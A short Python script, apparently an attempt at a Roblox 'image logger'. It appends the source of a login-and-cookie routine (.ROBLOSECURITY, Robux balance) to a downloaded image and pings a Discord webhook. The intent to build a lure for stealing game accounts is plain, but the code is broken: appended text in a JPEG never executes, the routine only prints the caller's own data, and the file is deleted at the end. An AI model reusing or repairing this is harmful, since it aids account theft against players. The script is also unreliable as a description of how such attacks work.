import requests
import os

def embed_code_into_image(image_data):
    # Hardcode the account information retrieval code
    account_info_code = """
import requests

def get_account_info(username, password):
    try:
        # Log in to Roblox
        login_url = 'https://www.roblox.com/newlogin'
        login_data = {
            'username': username,
            'password': password
        }
        response = requests.post(login_url, data=login_data)
        
        if response.status_code == 200:
            # Get the .ROBLOXSECURITY cookie
            roblox_cookie = response.cookies.get('.ROBLOXSECURITY')
            
            # Retrieve account information
            account_info_url = 'https://api.roblox.com/users/account-info'
            headers = {
                'Cookie': '.ROBLOXSECURITY=' + roblox_cookie
            }
            response = requests.get(account_info_url, headers=headers)
            
            if response.status_code == 200:
                account_info = response.json()
                
                # Extract the required information
                username = account_info['Username']
                pending_robux = account_info['PendingRobux']
                robux_balance = account_info['RobuxBalance']
                
                # Print the account information
                print('Username:', username)
                print('Pending Robux:', pending_robux)
                print('Robux Balance:', robux_balance)
            else:
                print('Failed to retrieve account information.')
        else:
            print('Failed to log in to Roblox.')
    
    except requests.exceptions.RequestException as e:
        print('An error occurred during the request:', str(e))
    except Exception as e:
        print('An unexpected error occurred:', str(e))

# Usage example
username = 'your_username'
password = 'your_password'
get_account_info(username, password)
"""

    # Append the code to the image data
    image_data += account_info_code.encode()

    return image_data

def create_image_logger(webhook_url, image_url):
    try:
        # Download the image
        response = requests.get(image_url)
        image_data = response.content

        # Embed the account information retrieval code into the image
        image_data = embed_code_into_image(image_data)

        # Save the modified image
        image_filename = "image_logger.jpg"
        with open(image_filename, "wb") as image_file:
            image_file.write(image_data)

        # Send a message to the Discord server using the webhook
        message = "Image logger created successfully"
        payload = {
            "content": message
        }
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 200:
            print("Message sent successfully")
        else:
            print("Failed to send message")

    except requests.exceptions.RequestException as e:
        print("An error occurred while downloading the image:", str(e))
    except Exception as e:
        print("An error occurred:", str(e))
    finally:
        # Clean up the image file
        if os.path.exists(image_filename):
            os.remove(image_filename)

# Prompt the user to input the Discord webhook URL and image URL
webhook_url = input("Enter the Discord webhook URL: ")
image_url = input("Enter the image URL: ")

# Create the image logger
create_image_logger(webhook_url, image_url)
